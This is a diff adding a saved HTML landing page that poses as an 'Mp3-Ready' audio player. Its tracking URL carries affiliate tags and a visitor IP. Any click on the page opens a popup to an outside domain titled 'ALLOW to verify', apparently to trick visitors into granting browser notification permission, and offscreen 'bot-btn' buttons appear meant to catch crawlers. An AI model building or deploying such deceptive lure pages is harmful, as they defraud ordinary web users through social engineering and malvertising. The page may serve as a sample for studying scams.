@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<!-- saved from url=(0319)https://read-this-hot-stuff.today/lp/onlineplayer/?tag=99957&tag1=LG%20DACOM%20Corporation_112.219.187.94&tag2=1716072&tag3=99957&tag4=dating&clickid=&device=Desktop&brand=Unknown&model=Unknown&country=KR&affid=99957&subid=1716072&ln=ko&cid=%7Bblk%7D&useragent=%7Bvar:useragent%7D&ip=112.219.187.94&bv=Chrome%2071&as=pc -->
+<html lang="en" onclick="wCenter(&#39;https://click-to-have-fun.online/lp/emptyplug/&#39;, &#39;ALLOW to verify&#39;, 320, 120);"><head class=""><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="manifest" href="https://read-this-hot-stuff.today/plugin/manifest.json">
+    
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Mp3-Ready</title>
+    <link rel="stylesheet" href="./Mp3-Ready_files/styles.css">
+    <link rel="stylesheet" href="./Mp3-Ready_files/style.css">
+    <link rel="icon" href="https://cdn.special-offers.online/lp/redplayer/favicon.png">
+    <meta class="" name="referrer" content="no-referrer"></head>
+<body class="">
+    <div class="container">
+        <div class="hand"></div>
+        <div class="handleft" id="handleft"></div>
+        <div class="handright" id="handright"></div>
+        <div class="contentleft" id="modalleft"></div>
+        <div class="contentright" id="modallright"></div>
+    </div>
+    <script>
+        function wCenter(url, title, w, h) {
+            var dualScreenLeft = window.screenLeft != undefined ? window.screenLeft : screen.left;
+            var dualScreenTop = window.screenTop != undefined ? window.screenTop : screen.top;
+            var width = window.innerWidth ? window.innerWidth : document.documentElement.clientWidth ? document.documentElement.clientWidth : screen.width;
+            var height = window.innerHeight ? window.innerHeight : document.documentElement.clientHeight ? document.documentElement.clientHeight : screen.height;
+            var left = ((width / 2) - (w / 2)) + dualScreenLeft;
+            var top = ((height / 2) - (h / 2)) + dualScreenTop;
+            var newWindow = window.open(url, title, 'scrollbars=no, width=' + w + ', height=' + h + ', top=' + top + ', left=' + left);
+                if (window.focus) {
+                    newWindow.focus();
+                }
+
+            var lefthand = document.getElementById('handleft');
+            var righthand = document.getElementById('handright');
+            var leftCont = document.getElementById('modalleft');
+            var rightCont = document.getElementById('modallright');
+            lefthand.style.display = "block";
+            righthand.style.display = "block";
+            leftCont.style.display = "block";
+            rightCont.style.display = "block";
+        }
+    </script>
+    <div class="size-indicator"></div>
+    <script src="./Mp3-Ready_files/IndexedDb.js.다운로드"></script>
+    <script src="./Mp3-Ready_files/log.js.다운로드"></script>
+    <script src="./Mp3-Ready_files/client.js.다운로드"></script><button class="bot-btn" style="top: 17169px; left: 11398.2px;"></button><button class="bot-btn" style="top: 9390.31px; left: 18378.5px;"></button><button class="bot-btn" style="top: 23594.7px; left: 20799.6px;"></button><button class="bot-btn" style="top: 23163.2px; left: 7235.67px;"></button><button class="bot-btn" style="top: 20753.2px; left: 16422.3px;"></button><button class="bot-btn" style="top: 6399.17px; left: 6700.73px;"></button><button class="bot-btn" style="top: 14906.4px; left: 24179.6px;"></button><button class="bot-btn" style="top: 19542.8px; left: 11454.5px;"></button><button class="bot-btn" style="top: 20957.4px; left: 20899.8px;"></button><button class="bot-btn" style="top: 16757.6px; left: 12158.8px;"></button><div class="modal1"><img class="" src="./Mp3-Ready_files/newB1modal.png"></div><div class="modal-overlay"></div>
+    <!--<script src="/plugin/js/script.js"></script>-->
+
+</body></html>
